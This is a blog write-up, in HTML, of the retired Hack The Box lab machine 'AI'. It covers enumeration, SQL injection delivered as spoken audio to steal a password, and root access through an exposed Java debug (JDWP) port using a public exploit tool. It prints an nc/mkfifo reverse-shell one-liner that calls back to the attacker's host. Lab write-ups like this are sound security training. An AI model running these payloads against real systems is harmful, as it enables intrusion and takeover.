@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - AI | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Hack The Box - AI" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My write-up / walkthrough for AI from Hack The Box." />
+<meta property="og:description" content="My write-up / walkthrough for AI from Hack The Box." />
+<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ai/" />
+<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ai/" />
+<meta property="og:site_name" content="0xRick" />
+<meta property="og:image" content="https://0xrick.github.io/hackthebox/ai/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-01-25T00:00:00+02:00" />
+<script type="application/ld+json">
+{"description":"My write-up / walkthrough for AI from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/ai/","image":"https://0xrick.github.io/hackthebox/ai/0.png","headline":"Hack The Box - AI","dateModified":"2020-01-25T00:00:00+02:00","datePublished":"2020-01-25T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/ai/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head><!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
+        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="/avatar.jpg" width="256px" height="256px" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
+
+  <br>
+<div>
+	<h7>    Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - AI</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/ssh/">ssh</a>
+      
+      <a class="tag" href="/tag/sqli/">sqli</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 25 Jan 2020</div>
+  
+  <div class="post-description">My write-up / walkthrough for AI from Hack The Box.</div>
+  
+  <hr>
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br>Hey guys, today AI retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is <code class="highlighter-rouge">10.10.10.163</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ai.htb</code>. Let’s jump right in !<br>
+<img src="/images/hackthebox/ai/0.png" alt="">
+<br></p>
+<hr>
+
+<h2 id="nmap">Nmap</h2>
+<p><br>As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/AI# nmap -sV -sT -sC -o nmapinitial ai.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 17:46 EST
+Nmap scan report for ai.htb (10.10.10.163)
+Host is up (0.83s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
+|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
+|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Hello AI!
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 123.15 seconds
+root@kali:~/Desktop/HTB/boxes/AI# 
+</code></pre></div></div>
+<p><br>We got <code class="highlighter-rouge">ssh</code> on port 22 and <code class="highlighter-rouge">http</code> on port 80.
+<br></p>
+<hr>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p><br>The index page was empty:<br>
+<img src="/images/hackthebox/ai/1.png" alt="">
+<br><br>By hovering over the logo a menu appears:<br>
+<img src="/images/hackthebox/ai/2.png" alt="">
+<br><br>The only interesting page there was <code class="highlighter-rouge">/ai.php</code>. From the description (“Drop your query using <code class="highlighter-rouge">wav</code> file.”) my first guess was that it’s a speech recognition service that processes users’ input and executes some query based on that processed input, And there’s also a possibility that this query is a <code class="highlighter-rouge">SQL</code> query but we’ll get to that later.:<br>
+<img src="/images/hackthebox/ai/3.png" alt="">
+<br><br>I also found another interesting page with <code class="highlighter-rouge">gobuster</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/AI# gobuster dir -u http://ai.htb/ -w /usr/share/wordlists/dirb/common.txt -x php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://ai.htb/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/01/24 18:57:23 Starting gobuster
+===============================================================
+----------
+ REDACTED
+----------
+/intelligence.php (Status: 200)
+----------
+ REDACTED
+----------
+===============================================================
+2020/01/24 19:00:49 Finished
+===============================================================
+root@kali:~/Desktop/HTB/boxes/AI# 
+</code></pre></div></div>
+<p><br>It had some instructions on how to use their speech recognition:<br>
+<img src="/images/hackthebox/ai/4.png" alt="">
+<br><br>I used <a href="https://ttsmp3.com/" target="_blank" rel="noopener noreferrer">ttsmp3.com</a> to generate audio files and I created a test file:<br>
+<img src="/images/hackthebox/ai/5.png" alt="">
+<br><br>But because the application only accepts <code class="highlighter-rouge">wav</code> files I converted the <code class="highlighter-rouge">mp3</code> file with <code class="highlighter-rouge">ffmpeg</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/AI/test# mv ~/Downloads/ttsMP3.com_VoiceText_2020-1-24_19_35_47.mp3 .
+root@kali:~/Desktop/HTB/boxes/AI/test# ffmpeg -i ttsMP3.com_VoiceText_2020-1-24_19_35_47.mp3 ttsMP3.com_VoiceText_2020-1-24_19_35_47.wav
+ffmpeg version 4.2.1-2+b1 Copyright (c) 2000-2019 the FFmpeg developers
+  built with gcc 9 (Debian 9.2.1-21)
+  configuration: --prefix=/usr --extra-version=2+b1 --toolchain=hardened --libdir=/usr/lib/x86_64-linux-gnu --incdir=/usr/include/x86_64-linux-gnu --arch=amd64 --enable-gpl --disable-stripping --enable-avresample --disable-filter=resample --enable-avisynth --enable-gnutls --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libbs2b --enable-libcaca --enable-libcdio --enable-libcodec2 --enable-libflite --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libgme --enable-libgsm --enable-libjack --enable-libmp3lame --enable-libmysofa --enable-libopenjpeg --enable-libopenmpt --enable-libopus --enable-libpulse --enable-librsvg --enable-librubberband --enable-libshine --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libssh --enable-libtheora --enable-libtwolame --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwavpack --enable-libwebp --enable-libx265 --enable-libxml2 --enable-libxvid --enable-libzmq --enable-libzvbi --enable-lv2 --enable-omx --enable-openal --enable-opengl --enable-sdl2 --enable-libdc1394 --enable-libdrm --enable-libiec61883 --enable-chromaprint --enable-frei0r --enable-libx264 --enable-shared
+  libavutil      56. 31.100 / 56. 31.100
+  libavcodec     58. 54.100 / 58. 54.100
+  libavformat    58. 29.100 / 58. 29.100
+  libavdevice    58.  8.100 / 58.  8.100
+  libavfilter     7. 57.100 /  7. 57.100
+  libavresample   4.  0.  0 /  4.  0.  0
+  libswscale      5.  5.100 /  5.  5.100
+  libswresample   3.  5.100 /  3.  5.100
+  libpostproc    55.  5.100 / 55.  5.100
+[mp3 @ 0x55b33e5f88c0] Estimating duration from bitrate, this may be inaccurate
+Input #0, mp3, from 'ttsMP3.com_VoiceText_2020-1-24_19_35_47.mp3':
+  Metadata:
+    encoder         : Lavf57.71.100
+  Duration: 00:00:00.63, start: 0.000000, bitrate: 48 kb/s
+    Stream #0:0: Audio: mp3, 22050 Hz, mono, fltp, 48 kb/s
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (mp3 (mp3float) -&gt; pcm_s16le (native))
+Press [q] to stop, [?] for help
+Output #0, wav, to 'ttsMP3.com_VoiceText_2020-1-24_19_35_47.wav':
+  Metadata:
+    ISFT            : Lavf58.29.100
+    Stream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 22050 Hz, mono, s16, 352 kb/s
+    Metadata:
+      encoder         : Lavc58.54.100 pcm_s16le
+size=      27kB time=00:00:00.62 bitrate= 353.8kbits/s speed= 146x    
+video:0kB audio:27kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.282118%
+root@kali:~/Desktop/HTB/boxes/AI/test# 
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/ai/6.png" alt="">
+<br><br>
+<img src="/images/hackthebox/ai/7.png" alt="">
+<br></p>
+<hr>
+
+<h2 id="sql-injection--alexas-credentials--ssh-as-alexa--user-flag">SQL injection –&gt; Alexa’s Credentials –&gt; SSH as Alexa –&gt; User Flag</h2>
+<p><br>As I said earlier, we don’t know what does it mean by “query” but it can be a <code class="highlighter-rouge">SQL</code> query. When I created another audio file that says <code class="highlighter-rouge">it's a test</code> I got a <code class="highlighter-rouge">SQL</code> error because of <code class="highlighter-rouge">'</code> in <code class="highlighter-rouge">it's</code>:<br>
+<img src="/images/hackthebox/ai/8.png" alt="">
+<br><br>The injection part was the hardest part of this box because it didn’t process the audio files correctly most of the time, and it took me a lot of time to get my payloads to work. 
+<br>First thing I did was to get the database name.
+<br>Payload:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>one open single quote union select database open parenthesis close parenthesis comment database
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/ai/9.png" alt="">
+<br><br>The database name was <code class="highlighter-rouge">alexa</code>, next thing I did was enumerating table names, my payload was like the one shown below and I kept changing the <code class="highlighter-rouge">test</code> after <code class="highlighter-rouge">from</code> and tried possible and common things.
+<br>Payload:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>one open single quote union select test from test comment database
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/ai/10.png" alt="">
+<br><br>The table <code class="highlighter-rouge">users</code> existed.
+<br>Payload:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>one open single quote union select test from users comment database
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/ai/11.png" alt="">
+<br><br>From here it was easy to guess the column names, <code class="highlighter-rouge">username</code> and <code class="highlighter-rouge">password</code>. The problem with <code class="highlighter-rouge">username</code> was that it processed <code class="highlighter-rouge">user</code> and <code class="highlighter-rouge">name</code> as two different words so I couldn’t make it work.
+<br>Payload:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>one open single quote union select username from users comment database
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/ai/12.png" alt="">
+<br><br><code class="highlighter-rouge">password</code> worked just fine.
+<br>Payload:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>one open single quote union select password from users comment database
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/ai/13.png" alt="">
+<br><br>Without knowing the username we can’t do anything with the password, I tried <code class="highlighter-rouge">alexa</code> which was the database name and it worked:<br>
+<img src="/images/hackthebox/ai/14.png" alt="">
+<br><br>We owned user.
+<br></p>
+<hr>
+
+<h2 id="jdwp--code-execution--root-shell--root-flag">JDWP –&gt; Code Execution –&gt; Root Shell –&gt; Root Flag</h2>
+<p><br>Privilege escalation on this box was very easy, when I checked the running processes I found this one:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alexa@AI:~$ ps aux
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+----------
+ REDACTED
+----------
+root      89984 18.8  5.4 3137572 110120 ?      Sl   22:44   0:06 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+----------
+ REDACTED
+----------
+alexa@AI:~$
+</code></pre></div></div>
+<p><br>This was related to an <code class="highlighter-rouge">Apache Tomcat</code> server that was running on <code class="highlighter-rouge">localhost</code>, I looked at that server for about 10 minutes but it was empty and I couldn’t do anything there, it was a rabbit hole. If we check the listening ports we’ll see <code class="highlighter-rouge">8080</code>, <code class="highlighter-rouge">8005</code> and <code class="highlighter-rouge">8009</code> which is perfectly normal because these are the ports used by <code class="highlighter-rouge">tomcat</code>, but we’ll also see <code class="highlighter-rouge">8000</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alexa@AI:~$ netstat -ntlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -
+tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      -
+alexa@AI:~$ 
+</code></pre></div></div>
+<p><br>A quick search on that port and how it’s related to <code class="highlighter-rouge">tomcat</code> revealed that it’s used for debugging, <code class="highlighter-rouge">jdwp</code> is running on that port.</p>
+
+<blockquote>
+  <p>The Java Debug Wire Protocol (JDWP) is the protocol used for communication between a debugger and the Java virtual machine (VM) which it debugs (hereafter called the target VM). -<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/jdwp-spec.html" target="_blank" rel="noopener noreferrer">docs.oracle.com</a></p>
+</blockquote>
+
+<p><br>By looking at the process again we can also see this parameter given to the <code class="highlighter-rouge">java</code> binary:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-agentlib:jdwp=transport=dt_socket,address=localhost:8000
+</code></pre></div></div>
+<p><br>I searched for exploits for the <code class="highlighter-rouge">jdwp</code> service and found <a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener noreferrer">this exploit</a>. I uploaded the python script on the box and I added the reverse shell payload to a file and called it <code class="highlighter-rouge">pwned.sh</code> then I ran the exploit:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alexa@AI:/dev/shm$ nano pwned.sh 
+alexa@AI:/dev/shm$ chmod +x pwned.sh 
+alexa@AI:/dev/shm$ cat pwned.sh 
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f
+alexa@AI:/dev/shm$ python jdwp-shellifier.py -t 127.0.0.1 --cmd /dev/shm/pwned.sh
+[+] Targeting '127.0.0.1:8000'
+[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
+[+] Found Runtime class: id=b8c
+[+] Found Runtime.getRuntime(): id=7f40bc03e790
+[+] Created break event id=2
+[+] Waiting for an event on 'java.net.ServerSocket.accept'
+</code></pre></div></div>
+<p><br>Then from another <code class="highlighter-rouge">ssh</code> session I triggered a connection on port <code class="highlighter-rouge">8005</code>:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alexa@AI:~$ nc localhost 8005
+
+
+</code></pre></div></div>
+<p><br>And the code was executed:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alexa@AI:/dev/shm$ nano pwned.sh 
+alexa@AI:/dev/shm$ chmod +x pwned.sh 
+alexa@AI:/dev/shm$ cat pwned.sh 
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f
+alexa@AI:/dev/shm$ python jdwp-shellifier.py -t 127.0.0.1 --cmd /dev/shm/pwned.sh
+[+] Targeting '127.0.0.1:8000'
+[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
+[+] Found Runtime class: id=b8c
+[+] Found Runtime.getRuntime(): id=7f40bc03e790
+[+] Created break event id=2
+[+] Waiting for an event on 'java.net.ServerSocket.accept'
+[+] Received matching event from thread 0x1
+[+] Selected payload '/dev/shm/pwned.sh'
+[+] Command string object created id:c31
+[+] Runtime.getRuntime() returned context id:0xc32
+[+] found Runtime.exec(): id=7f40bc03e7c8
+[+] Runtime.exec() successful, retId=c33
+[!] Command successfully executed
+alexa@AI:/dev/shm$ 
+</code></pre></div></div>
+<p><br>
+<img src="/images/hackthebox/ai/15.png" alt="">
+<br>
+<br>And we owned root !
+<br>That’s it , Feedback is appreciated !
+<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
+<br>Thanks for reading.
+<br>
+<br>
+<br>Previous Hack The Box write-up : <a href="/hack-the-box/player/">Hack The Box - Player</a></p>
+<hr>
+
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/player/">
+            Hack The Box - Player
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/bitlab/">
+            Hack The Box - Bitlab
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/craft/">
+            Hack The Box - Craft
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>All Tags</h2>
+  <div class="tag-cloud">
+<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-2">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/jwt/" class="set-1">jwt</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/postgresql/" class="set-1">postgresql</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
+</div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper">
+<div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+if (localStorage.getItem("theme") === null) {
+    window.localStorage.setItem('theme', 'dark');
+}
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script>
+</div>
+  
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
